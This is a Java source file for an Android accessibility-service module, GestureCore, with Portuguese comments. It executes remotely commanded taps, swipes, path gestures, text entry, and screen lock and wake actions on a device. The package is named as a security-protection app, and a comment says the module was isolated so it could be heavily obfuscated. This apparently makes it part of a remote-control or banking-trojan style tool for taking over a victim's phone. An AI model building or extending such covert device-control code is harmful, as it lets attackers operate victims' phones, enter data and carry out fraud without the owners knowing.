package com.seguranca.protecao;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * Core isolado de injeção de gestos remotos (click, swipe, navigation, type).
 * Separado de UiAssistBridge para permitir ofuscação agressiva via R8 + LSParanoid.
 */
@Obfuscate
public class GestureCore {

    private static final String TAG = "GestureCore";

    public interface ScreenWakeDelegate {
        void wakeUpScreen();
    }

    private final AccessibilityService service;
    private final ScreenWakeDelegate wakeDelegate;

    public GestureCore(AccessibilityService service, ScreenWakeDelegate wakeDelegate) {
        this.service = service;
        this.wakeDelegate = wakeDelegate;
    }

    /**
     * Processa intent PERFORM_GESTURE recebido pelo UiAssistBridge.
     */
    public void handlePerformGesture(Intent intent) {
        String action = intent.getStringExtra("action");
        Log.d(TAG, "EXECUTANDO GESTO: " + action);

        try {
            if ("BACK".equals(action)) {
                Log.d(TAG, "Executando BACK");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                return;
            } else if ("HOME".equals(action)) {
                Log.d(TAG, "Executando HOME");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                return;
            } else if ("RECENTS".equals(action)) {
                Log.d(TAG, "Executando RECENTS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                return;
            } else if ("POWER".equals(action)) {
                Log.d(TAG, "Executando POWER (toggle screen)");
                android.os.PowerManager pm = (android.os.PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);
                boolean isScreenOn = pm != null && pm.isInteractive();
                if (isScreenOn) {
                    Log.d(TAG, "Tela ligada, desligando...");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                } else {
                    Log.d(TAG, "Tela desligada, acordando...");
                    if (wakeDelegate != null) {
                        wakeDelegate.wakeUpScreen();
                    }
                }
                return;
            } else if ("LOCK_SCREEN".equals(action)) {
                Log.d(TAG, "Executando LOCK_SCREEN (somente bloquear)");
                android.os.PowerManager pmLock = (android.os.PowerManager)
                        service.getSystemService(Context.POWER_SERVICE);
                if (pmLock != null && pmLock.isInteractive()) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                } else {
                    Log.d(TAG, "Tela ja desligada — bypass LOCK_DEVICE");
                }
                return;
            } else if ("POWER_MENU".equals(action)) {
                Log.d(TAG, "Executando POWER_MENU");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                }
                return;
            } else if ("NOTIFICATIONS".equals(action)) {
                Log.d(TAG, "Abrindo NOTIFICATIONS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                return;
            } else if ("QUICK_SETTINGS".equals(action)) {
                Log.d(TAG, "Abrindo QUICK_SETTINGS");
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                return;
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                Log.e(TAG, "Android versao muito antiga para gestos!");
                return;
            }

            if ("CLICK".equals(action)) {
                executeClick(intent.getIntExtra("x", 0), intent.getIntExtra("y", 0));
            } else if ("SWIPE".equals(action)) {
                executeSwipe(
                        intent.getIntExtra("x1", 0),
                        intent.getIntExtra("y1", 0),
                        intent.getIntExtra("x2", 0),
                        intent.getIntExtra("y2", 0));
            } else if ("LONG_PRESS".equals(action)) {
                executeLongPress(
                        intent.getIntExtra("x", 0),
                        intent.getIntExtra("y", 0),
                        intent.getIntExtra("duration", 500));
            } else if ("TYPE".equals(action)) {
                executeType(intent.getStringExtra("text"));
            } else if ("PATH_GESTURE".equals(action)) {
                String pathJson = intent.getStringExtra("path");
                if (pathJson != null && !pathJson.isEmpty()) {
                    try {
                        org.json.JSONArray arr = new org.json.JSONArray(pathJson);
                        int[][] points = new int[arr.length()][2];
                        for (int i = 0; i < arr.length(); i++) {
                            org.json.JSONObject pt = arr.getJSONObject(i);
                            points[i][0] = pt.getInt("x");
                            points[i][1] = pt.getInt("y");
                        }
                        executePathGesture(points);
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao parsear PATH_GESTURE: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao executar gesto: " + e.getMessage());
        }
    }

    public void executeClick(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "Executando CLICK em (" + x + ", " + y + ")");

        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x + 2, y + 1);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 120);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(),
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        Log.d(TAG, "CLICK executado com sucesso!");
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        Log.e(TAG, "CLICK cancelado!");
                    }
                }, null);

        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar CLICK!");
        }
    }

    public void executeSwipe(int x1, int y1, int x2, int y2) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "Executando SWIPE de (" + x1 + ", " + y1 + ") para (" + x2 + ", " + y2 + ")");

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 300);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(),
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        Log.d(TAG, "SWIPE executado com sucesso!");
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        Log.e(TAG, "SWIPE cancelado!");
                    }
                }, null);

        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar SWIPE!");
        }
    }

    public void executeLongPress(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "Executando LONG PRESS em (" + x + ", " + y + ") por " + duration + "ms");

        Path path = new Path();
        path.moveTo(x, y);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, duration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(),
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        Log.d(TAG, "LONG PRESS executado com sucesso!");
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        Log.e(TAG, "LONG PRESS cancelado!");
                    }
                }, null);

        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar LONG PRESS!");
        }
    }

    public void executePathGesture(int[][] points) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        if (points == null || points.length < 2) {
            Log.e(TAG, "PATH_GESTURE precisa de pelo menos 2 pontos");
            return;
        }

        Log.d(TAG, "Executando PATH_GESTURE com " + points.length + " pontos");

        Path path = new Path();
        path.moveTo(points[0][0], points[0][1]);

        for (int i = 1; i < points.length; i++) {
            path.lineTo(points[i][0], points[i][1]);
            Log.d(TAG, "  -> Ponto " + i + ": (" + points[i][0] + ", " + points[i][1] + ")");
        }

        long duration = points.length * 100L;

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, duration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = service.dispatchGesture(builder.build(),
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        Log.d(TAG, "PATH_GESTURE executado com sucesso!");
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        Log.e(TAG, "PATH_GESTURE cancelado!");
                    }
                }, null);

        if (!dispatched) {
            Log.e(TAG, "Falha ao enviar PATH_GESTURE!");
        }
    }

    public void executeType(String text) {
        Log.d(TAG, "Tentando digitar: " + text);

        AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
        if (rootNode == null) {
            Log.e(TAG, "Nao conseguiu obter rootNode para digitar");
            return;
        }

        AccessibilityNodeInfo focusedNode = rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);

        if (focusedNode != null && focusedNode.isEditable()) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            boolean success = focusedNode.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);

            if (success) {
                Log.d(TAG, "Texto digitado com sucesso!");
            } else {
                Log.e(TAG, "Falha ao digitar texto");
            }

            focusedNode.recycle();
        } else {
            Log.e(TAG, "Nenhum campo de texto focado encontrado");
        }

        rootNode.recycle();
    }
}
